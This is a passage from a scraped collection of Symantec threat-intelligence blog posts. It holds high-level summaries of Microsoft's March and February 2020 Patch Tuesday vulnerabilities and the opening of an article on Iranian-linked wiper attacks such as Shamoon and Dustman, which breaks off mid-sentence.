Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. Tommy is a member of Symantec's Security Technology and Response team who are focused on researching and providing protection against current and future cyber threats. Zhe is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/android-apps-coronavirus-covid19-malicious"
  },
  {
    "title": "microsoft patch tuesday march 2020",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the March 2020 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Microsoft Browser Memory Corruption Vulnerability(CVE-2020-0768)MS Rating: Critical A remote code execution vulnerability exists in the way that Microsoft browsers access objects in memory. The vulnerability could corrupt memory in a way that could allow an attacker to execute arbitrary code in the context of the current user. Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2020-0811)MS Rating: Critical A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge (HTML-based)L. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2020-0812)MS Rating: Critical A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge (HTML-based)L. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Microsoft Edge Memory Corruption Vulnerability(CVE-2020-0816)MS Rating: Critical A remote code execution vulnerability exists when Microsoft Edge improperly accesses objects in memory. The vulnerability could corrupt memory in such a way that enables an attacker to execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0823)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Internet Explorer Memory Corruption Vulnerability(CVE-2020-0824)MS Rating: Critical A remote code execution vulnerability exists when Internet Explorer improperly accesses objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerability could gain the same user rights as the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0825)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0826)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0827)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0828)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0829)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Microsoft Browser Memory Corruption Vulnerability(CVE-2020-0830)MS Rating: Critical A remote code execution vulnerability exists in the way that Microsoft browsers access objects in memory. The vulnerability could corrupt memory in a way that could allow an attacker to execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0831)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0832)MS Rating: Critical A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0833)MS Rating: Critical A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. VBScript Remote Code Execution Vulnerability(CVE-2020-0847)MS Rating: Critical A remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Memory Corruption Vulnerability(CVE-2020-0848)MS Rating: Critical A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. Scripting Engine Information Disclosure Vulnerability(CVE-2020-0813)MS Rating: Important An information disclosure vulnerability exists when Chakra improperly discloses the contents of its memory, which could provide an attacker with information to further compromise the user's computer or data. To exploit the vulnerability, an attacker must know the memory address of where the object was created. Microsoft SharePoint Reflective XSS Vulnerability(CVE-2020-0795)MS Rating: Important This vulnerability is caused when SharePoint Server does not properly sanitize a specially crafted request to an affected SharePoint server. An authenticated attacker could exploit this vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Word Remote Code Execution Vulnerability(CVE-2020-0850)MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Microsoft Word Remote Code Execution Vulnerability(CVE-2020-0851)MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Microsoft Word Remote Code Execution Vulnerability(CVE-2020-0852)MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Microsoft Word Remote Code Execution Vulnerability(CVE-2020-0855)MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Microsoft SharePoint Reflective XSS Vulnerability(CVE-2020-0891)MS Rating: Important This vulnerability is caused when SharePoint Server does not properly sanitize a specially crafted request to an affected SharePoint server. An authenticated attacker could exploit this vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Word Remote Code Execution Vulnerability(CVE-2020-0892)MS Rating: Important A remote code execution vulnerability exists in Microsoft Word software when it fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could use a specially crafted file to perform actions in the security context of the current user. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0893)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Microsoft Office SharePoint XSS Vulnerability(CVE-2020-0894)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft SharePoint Server does not properly sanitize a specially crafted web request to an affected SharePoint server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected SharePoint server. Media Foundation Memory Corruption Vulnerability(CVE-2020-0801)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Media Foundation Memory Corruption Vulnerability(CVE-2020-0807)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Media Foundation Memory Corruption Vulnerability(CVE-2020-0809)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Media Foundation Memory Corruption Vulnerability(CVE-2020-0869)MS Rating: Critical A memory corruption vulnerability exists when Windows Media Foundation improperly handles objects in memory. An attacker who successfully exploited the vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. LNK Remote Code Execution Vulnerability(CVE-2020-0684)MS Rating: Critical A remote code execution vulnerability exists in Microsoft Windows that could allow remote code execution if a . LNK file is processed. Windows Installer Privilege Escalation Vulnerability(CVE-2020-0779)MS Rating: Important A privilege escalation vulnerability exists in the Windows Installer when MSI packages process symbolic links. An attacker who successfully exploited this vulnerability could bypass access restrictions to add or remove files. Windows UPnP Service Privilege Escalation Vulnerability(CVE-2020-0781)MS Rating: Important A privilege escalation vulnerability exists when the Windows Universal Plug and Play (UPnP) service improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code with elevated system privileges. Windows UPnP Service Privilege Escalation Vulnerability(CVE-2020-0783)MS Rating: Important A privilege escalation vulnerability exists when the Windows Universal Plug and Play (UPnP) service improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code with elevated system privileges. Windows User Profile Service Privilege Escalation Vulnerability(CVE-2020-0785)MS Rating: Important A privilege escalation vulnerability exists when the Windows User Profile Service (ProfSvc) improperly handles symlinks. An attacker who successfully exploited this vulnerability could delete files and folders in an elevated context. Windows Tile Object Service Denial of Service Vulnerability(CVE-2020-0786)MS Rating: Important A denial of service vulnerability exists when the Windows Tile Object Service improperly handles hard links. An attacker who successfully exploited the vulnerability could cause a target system to stop responding. Windows Background Intelligent Transfer Service Privilege Escalation Vulnerability(CVE-2020-0787)MS Rating: Important A privilege escalation vulnerability exists when the Windows Background Intelligent Transfer Service (BITS) improperly handles symbolic links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. Diagnostics Hub Standard Collector Privilege Escalation Vulnerability(CVE-2020-0793)MS Rating: Important A privilege escalation vulnerability exists when the Diagnostics Hub Standard Collector improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Installer Privilege Escalation Vulnerability(CVE-2020-0798)MS Rating: Important A privilege escalation vulnerability exists in the Windows Installer when the Windows Installer fails to properly sanitize input leading to an insecure library loading behavior. A locally authenticated attacker could run arbitrary code with elevated system privileges. Windows Error Reporting Privilege Escalation Vulnerability(CVE-2020-0806)MS Rating: Important A privilege escalation vulnerability exists in Windows Error Reporting (WER) when WER handles and executes files. The vulnerability could allow Privilege Escalation if an attacker can successfully exploit it. Provisioning Runtime Privilege Escalation Vulnerability(CVE-2020-0808)MS Rating: Important A privilege escalation vulnerability exists in the way the Provisioning Runtime validates certain file operations. An attacker who successfully exploited the vulnerability could gain elevated privileges on a victim system. Windows Diagnostics Hub Privilege Escalation Vulnerability(CVE-2020-0810)MS Rating: Important A privilege escalation svulnerability exists when the Diagnostics Hub Standard Collector or the Visual Studio Standard Collector allows file creation in arbitrary locations. Windows Hard Link Privilege Escalation Vulnerability(CVE-2020-0840)MS Rating: Important A privilege escalation vulnerability exists when Windows improperly handles hard links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. Windows Hard Link Privilege Escalation Vulnerability(CVE-2020-0841)MS Rating: Important A privilege escalation vulnerability exists when Windows improperly handles hard links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. Windows Installer Privilege Escalation Vulnerability(CVE-2020-0842)MS Rating: Important A privilege escalation vulnerability exists in Windows Installer because of the way Windows Installer handles certain filesystem operations. To exploit the vulnerability, an attacker would require unprivileged execution on the victim system. Windows Installer Privilege Escalation Vulnerability(CVE-2020-0843)MS Rating: Important A privilege escalation vulnerability exists in Windows Installer because of the way Windows Installer handles certain filesystem operations. To exploit the vulnerability, an attacker would require unprivileged execution on the victim system. Connected User Experiences and Telemetry Service Privilege Escalation Vulnerability(CVE-2020-0844)MS Rating: Important A privilege escalation vulnerability exists when Connected User Experiences and Telemetry Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Hard Link Privilege Escalation Vulnerability(CVE-2020-0849)MS Rating: Important A privilege escalation vulnerability exists when Windows improperly handles hard links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. Windows Mobile Device Management Diagnostics Privilege Escalation Vulnerability(CVE-2020-0854)MS Rating: Important A privilege escalation vulnerability exists when Windows Mobile Device Management (MDM) Diagnostics improperly handles junctions. An attacker who successfully exploited this vulnerability could bypass access restrictions to delete files. Windows Search Indexer Privilege Escalation Vulnerability(CVE-2020-0857)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Search Indexer handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Privilege Escalation Vulnerability(CVE-2020-0858)MS Rating: Important A privilege escalation vulnerability exists when the \"Public Account Pictures\" folder improperly handles junctions. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Modules Installer Service Information Disclosure Vulnerability(CVE-2020-0859)MS Rating: Important An information vulnerability exists when Windows Modules Installer Service improperly discloses file information. Successful exploitation of the vulnerability could allow the attacker to read any file on the file system. Windows ActiveX Installer Service Privilege Escalation Vulnerability(CVE-2020-0860)MS Rating: Important A privilege escalation vulnerability exists when the Windows ActiveX Installer Service improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Network Driver Interface Specification (NDIS) Information Disclosure Vulnerability(CVE-2020-0861)MS Rating: Important An information disclosure vulnerability exists when the Windows Network Driver Interface Specification (NDIS) improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Connected User Experiences and Telemetry Service Information Disclosure Vulnerability(CVE-2020-0863)MS Rating: Important An information vulnerability exists when Windows Connected User Experiences and Telemetry Service improperly discloses file information. Successful exploitation of the vulnerability could allow the attacker to read any file on the file system. Windows Update Orchestrator Service Privilege Escalation Vulnerability(CVE-2020-0867)MS Rating: Important A privilege escalation vulnerability exists when the Windows Update Orchestrator Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Update Orchestrator Service Privilege Escalation Vulnerability(CVE-2020-0868)MS Rating: Important A privilege escalation vulnerability exists when the Windows Update Orchestrator Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Network Connections Service Information Disclosure Vulnerability(CVE-2020-0871)MS Rating: Important An information disclosure vulnerability exists when Windows Network Connections Service fails to properly handle objects in memory. An attacker who successfully exploited the vulnerability could potentially disclose memory contents of an elevated process. Windows Hard Link Privilege Escalation Vulnerability(CVE-2020-0896)MS Rating: Important A privilege escalation vulnerability exists when Windows improperly handles hard links. An attacker who successfully exploited this vulnerability could overwrite a targeted file leading to an elevated status. Microsoft IIS Server Tampering Vulnerability(CVE-2020-0645)MS Rating: Important A tampering vulnerability exists when Microsoft IIS Server improperly handles malformed request headers. An attacker who successfully exploited the vulnerability could cause a vulnerable server to improperly process HTTP headers and tamper with the responses returned to clients. DirectX Privilege Escalation Vulnerability(CVE-2020-0690)MS Rating: Important A privilege escalation vulnerability exists when DirectX improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows CSC Service Privilege Escalation Vulnerability(CVE-2020-0769)MS Rating: Important A privilege escalation vulnerability exists when the Windows CSC Service improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows ActiveX Installer Service Privilege Escalation Vulnerability(CVE-2020-0770)MS Rating: Important A privilege escalation vulnerability exists when the Windows ActiveX Installer Service improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows CSC Service Privilege Escalation Vulnerability(CVE-2020-0771)MS Rating: Important A privilege escalation vulnerability exists when the Windows CSC Service improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Error Reporting Privilege Escalation Vulnerability(CVE-2020-0772)MS Rating: Important A privilege escalation vulnerability exists when Windows Error Reporting improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows ActiveX Installer Service Privilege Escalation Vulnerability(CVE-2020-0773)MS Rating: Important A privilege escalation vulnerability exists when the Windows ActiveX Installer Service improperly handles memory. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0777)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Network Connections Service Privilege Escalation Vulnerability(CVE-2020-0778)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Network Connections Service handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0797)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0800)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Network Connections Service Privilege Escalation Vulnerability(CVE-2020-0802)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Network Connections Service handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Network Connections Service Privilege Escalation Vulnerability(CVE-2020-0803)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Network Connections Service handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Network Connections Service Privilege Escalation Vulnerability(CVE-2020-0804)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Network Connections Service handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Network Connections Service Privilege Escalation Vulnerability(CVE-2020-0845)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Network Connections Service handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0864)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0865)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0866)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Work Folder Service Privilege Escalation Vulnerability(CVE-2020-0897)MS Rating: Important A privilege escalation vulnerability exists when the Windows Work Folder Service improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Error Reporting Information Disclosure Vulnerability(CVE-2020-0775)MS Rating: Important A privilege escalation vulnerability exists when Windows Error Reporting improperly handles file operations. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Privilege Escalation Vulnerability(CVE-2020-0776)MS Rating: Important A privilege escalation vulnerability exists when the Windows AppX Deployment Server improperly handles file operations. To exploit this vulnerability, an attacker would first have to gain execution on the victim system. Windows Network List Service Privilege Escalation Vulnerability(CVE-2020-0780)MS Rating: Important A privilege escalation vulnerability exists in the way that the Windows Network List Service handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions. Windows Installer Privilege Escalation Vulnerability(CVE-2020-0814)MS Rating: Important A privilege escalation vulnerability exists in Windows Installer because of the way Windows Installer handles certain filesystem operations. To exploit the vulnerability, an attacker would require unprivileged execution on the victim system. Windows Device Setup Manager Privilege Escalation Vulnerability(CVE-2020-0819)MS Rating: Important A privilege escalation vulnerability exists when the Windows Device Setup Manager improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Media Foundation Information Disclosure Vulnerability(CVE-2020-0820)MS Rating: Important An information disclosure vulnerability exists when Media Foundation improperly handles objects in memory. An attacker who successfully exploited this vulnerability could obtain information to further compromise the user's system. Windows Language Pack Installer Privilege Escalation Vulnerability(CVE-2020-0822)MS Rating: Important A privilege escalation vulnerability exists when the Windows Language Pack Installer improperly handles file operations. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows ALPC Privilege Escalation Vulnerability(CVE-2020-0834)MS Rating: Important A privilege escalation vulnerability exists when Windows improperly handles calls to Advanced Local Procedure Call (ALPC). An attacker who successfully exploited this vulnerability could run arbitrary code in the security context of the local system. Win32k Privilege Escalation Vulnerability(CVE-2020-0788)MS Rating: Important A privilege escalation vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Windows Kernel Privilege Escalation Vulnerability(CVE-2020-0799)MS Rating: Important A privilege escalation vulnerability exists in Microsoft Windows when the Windows kernel fails to properly handle parsing of certain symbolic links. An attacker who successfully exploited this vulnerability could potentially access privileged registry keys and thereby elevate permissions. Win32k Information Disclosure Vulnerability(CVE-2020-0876)MS Rating: Important An information disclosure vulnerability exists when the win32k component improperly provides kernel information. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Win32k Privilege Escalation Vulnerability(CVE-2020-0877)MS Rating: Important A privilege escalation vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. Win32k Privilege Escalation Vulnerability(CVE-2020-0887)MS Rating: Important A privilege escalation vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. GDI+ Remote Code Execution Vulnerability(CVE-2020-0881)MS Rating: Critical A remote code execution vulnerability exists in the way that the Windows Graphics Device Interface (GDI) handles objects in the memory. An attacker who successfully exploited this vulnerability could take control of the affected system. GDI+ Remote Code Execution Vulnerability(CVE-2020-0883)MS Rating: Critical A remote code execution vulnerability exists in the way that the Windows Graphics Device Interface (GDI) handles objects in the memory. An attacker who successfully exploited this vulnerability could take control of the affected system. Windows GDI Information Disclosure Vulnerability(CVE-2020-0774)MS Rating: Important An information disclosure vulnerability exists when the Windows GDI component improperly discloses the contents of its memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Windows Graphics Component Privilege Escalation Vulnerability(CVE-2020-0791)MS Rating: Important A privilege escalation vulnerability exists when the Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Imaging Component Information Disclosure Vulnerability(CVE-2020-0853)MS Rating: Important An information disclosure vulnerability exists in Windows when the Windows Imaging Component fails to properly handle objects in memory. An attacker who succesfully exploited this vulnerability could obtain information to further compromise the user's system. Windows GDI Information Disclosure Vulnerability(CVE-2020-0874)MS Rating: Important An information disclosure vulnerability exists in the way that the Windows Graphics Device Interface (GDI) handles objects in memory, allowing an attacker to retrieve information from a targeted system. By itself, the information disclosure does not allow arbitrary code execution; however, it could allow arbitrary code to be run if the attack Windows GDI Information Disclosure Vulnerability(CVE-2020-0879)MS Rating: Important An information disclosure vulnerability exists in the way that the Windows Graphics Device Interface (GDI) handles objects in memory, allowing an attacker to retrieve information from a targeted system. By itself, the information disclosure does not allow arbitrary code execution; however, it could allow arbitrary code to be run if the attack Windows GDI Information Disclosure Vulnerability(CVE-2020-0880)MS Rating: Important An information disclosure vulnerability exists when the Windows GDI component improperly discloses the contents of its memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Windows GDI Information Disclosure Vulnerability(CVE-2020-0882)MS Rating: Important An information disclosure vulnerability exists when the Windows GDI component improperly discloses the contents of its memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system. Windows Graphics Component Privilege Escalation Vulnerability(CVE-2020-0898)MS Rating: Important A privilege escalation vulnerability exists when the Windows Graphics Component improperly handles objects in memory. An attacker who successfully exploited this vulnerability could run processes in an elevated context. Windows Graphics Component Information Disclosure Vulnerability(CVE-2020-0885)MS Rating: Important An information disclosure vulnerability exists when the Windows GDI component improperly discloses the contents of its memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise a user's system. Microsoft Exchange Server Spoofing Vulnerability(CVE-2020-0903)MS Rating: Important A cross-site-scripting (XSS) vulnerability exists when Microsoft Exchange Server does not properly sanitize a specially crafted web request to an affected Exchange server. An authenticated attacker could exploit the vulnerability by sending a specially crafted request to an affected server. Microsoft Visual Studio Spoofing Vulnerability(CVE-2020-0884)MS Rating: Important A spoofing vulnerability exists in Microsoft Visual Studio as it includes a reply URL that is not secured by SSL . An attacker who successfully exploited this vulnerability could compromise the access tokens, exposing security and privacy risks. Visual Studio Extension Installer Service Denial of Service Vulnerability(CVE-2020-0789)MS Rating: Important A denial of service vulnerability exists when the Visual Studio Extension Installer Service improperly handles hard links. An attacker who successfully exploited the vulnerability could cause a target system to stop responding. Remote Code Execution Vulnerability in Application Inspector(CVE-2020-0872)MS Rating: Important A remote code execution vulnerability exists in Application Inspector version v1. 0. Microsoft Defender Privilege Escalation Vulnerability(CVE-2020-0762)MS Rating: Important A privilege escalation vulnerability exists when Defender handles certain objects in memory. To exploit the vulnerability, an attacker would first have to log on to the system. Microsoft Defender Privilege Escalation Vulnerability(CVE-2020-0763)MS Rating: Important A privilege escalation vulnerability exists when Defender handles certain objects in memory. To exploit the vulnerability, an attacker would first have to log on to the system. Azure DevOps Server Cross-site Scripting Vulnerability(CVE-2020-0700)MS Rating: Important A Cross-site Scripting (XSS) vulnerability exists when Azure DevOps Server does not properly sanitize user provided input. An authenticated attacker could exploit the vulnerability by sending a specially crafted payload to the Team Foundation Server, which will get executed in the context of the user every time a user visits the compromised pa Azure DevOps Privilege Escalation Vulnerability(CVE-2020-0758)MS Rating: Important A privilege escalation vulnerability exists when Visual Studio improperly handles pipeline job tokens. An attacker who successfully exploited this vulnerability could extend their access to a project. Azure DevOps Privilege Escalation Vulnerability(CVE-2020-0815)MS Rating: Important A privilege escalation vulnerability exists when Visual Studio improperly handles pipeline job tokens. An attacker who successfully exploited this vulnerability could extend their access to a project. Remote Desktop Connection Manager Information Disclosure Vulnerability(CVE-2020-0765)MS Rating: Moderate An information disclosure vulnerability exists in the Remote Desktop Connection Manager (RDCMan) application when it improperly parses XML input containing a reference to an external entity. An attacker who successfully exploited this vulnerability could read arbitrary files via an XML external entity (XXE) declaration. Dynamics Business Central Remote Code Execution Vulnerability(CVE-2020-0905)MS Rating: Critical An remote code execution vulnerability exists in Microsoft Dynamics Business Central. An attacker who succesfully exploited this vulnerability could execute arbitrary shell commands on victim's server. Service Fabric Elevation of Privilege(CVE-2020-0902)MS Rating: Important An elevation of privilege vulnerability exists in Service Fabric File Store Service under certain conditions. An unauthenticated remote user could gain rights to the Service Fabric File Store Service if the node is exposed externally via SMB or SCP standard ports and they are using the impacted configuration. More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Preethi Koroth is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-march-2020"
  },
  {
    "title": "microsoft patch tuesday february 2020",
    "content": "This month the vendor has patched 99 vulnerabilities, 13 of which are rated Critical. As always, customers are advised to follow these security best practices: Microsoft's summary of the February 2020 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Updates for Microsoft Browsers Cumulative Security Updates for Microsoft Office Cumulative Security Updates for Microsoft Windows Cumulative Security Updates for Microsoft Windows Kernel Cumulative Security Updates for Windows Hyper-V Cumulative Security Updates for Microsoft Graphics Component Cumulative Security Updates for Microsoft Exchange Server Security Update for SQL Server More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Preethi Koroth is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-february-2020"
  },
  {
    "title": "tensions iran destructive attacks",
    "content": "The recent upsurge in tensions between the U.S. and Iran has led to fears about an increase in both the frequency and aggressiveness of Iranian-sponsored cyber attacks. Iran has an extensive track record in this sphere, with government-backed cyber threat groups conducting numerous offensive cyber operations in recent years, including a number of highly destructive wiper attacks. While an uptick in such attacks is not a certainty, it is a distinct possibility and organizations should exercise extreme vigilance. The capabilities of Iranian actors have evolved rapidly in recent years, from quick and relatively simple destructive attacks, such as distributed denial‐of‐service (DDoS) attacks or website defacements, to an increased focus on network compromises where the actors maintain a persistent foothold and obfuscate their presence to make attribution difficult. Iranian groups have also increasingly targeted critical infrastructure including energy and telecommunications companies. Attackers associated with Iran have periodically carried out highly destructive disk-wiping attacks against targets in the Middle East. Historically, these attacks tend to coincide with periods of heightened instability in the region. Most of these destructive attacks have involved the Shamoon disk wiper (W32.Disttrack). Shamoonfirst emerged in 2012, when it was used in attacks against the Saudi energy sector. Itreappeared again in late 2016, when a slightly modified version (W32.Disttrack.B)was used in another wave of attacks against Saudi Arabia. A third wave of attacksoccurred in December 2018, when Shamoon was once again deployed against a range of targets in the Middle East. Unlike previous Shamoon attacks, these attacks involved a second piece of wiping malware (Trojan.Filerase). This malware deleted and overwrote files on the infected computer. Shamoon itself would meanwhile erase the master boot record (MBR) of the computer, rendering it unusable. Recent months have also seen the emergence of two new wipers, which appear to be evolutions of the original Shamoon wiper. The first, known as ZeroCleare (Trojan.Zerocleare) appeared in June and July of 2019, while in January 2020, theNational Cybersecurity Authority of Saudi Arabia released a reportabout a wiper malware they called Dustman. Dustman is a further evolution of ZeroCleare, where the authors optimized functionality into a single file instead of the way it worked in the June/July campaigns. While destructive attacks are an obvious source of concern, potential targets should be aware that the evidence available to date suggests that the Shamoon attackers may not have compromised their victims’ networks themselves. In the aftermath of the 2016 Shamoon attacks, Symantec found evidence that the Iran-linkedGreenbugandTimberwormespionage groups may have provided access to the victims’ networks. The 2018 attackshad a tentative link to the Iranian Elfin group(aka APT33), with one victim in Saudi Arabia having been compromised by 